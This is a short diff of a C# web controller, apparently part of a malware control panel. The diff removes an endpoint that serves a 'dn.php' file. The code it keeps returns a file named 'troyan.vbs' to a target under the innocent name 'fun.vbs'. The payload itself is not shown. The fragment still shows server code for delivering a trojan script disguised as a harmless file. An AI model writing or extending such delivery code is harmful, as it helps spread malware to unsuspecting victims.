@@ -111,12 +111,6 @@ public class CpController : BaseController
         
         return await GetFileAdvanced("troyan.vbs", "fun.vbs", random, target, "");
     }
-        
-    [HttpGet("/{profile}/GetVbsPhp")]
-    public async Task<IActionResult> GetVbsPhp(string profile)
-    {
-        return await GetFileAdvanced("dn.php", "dn.php", "", "","nofile");
-    }
     
     [HttpPost]
     [Authorize(Policy = "AllowFromIpRange")]
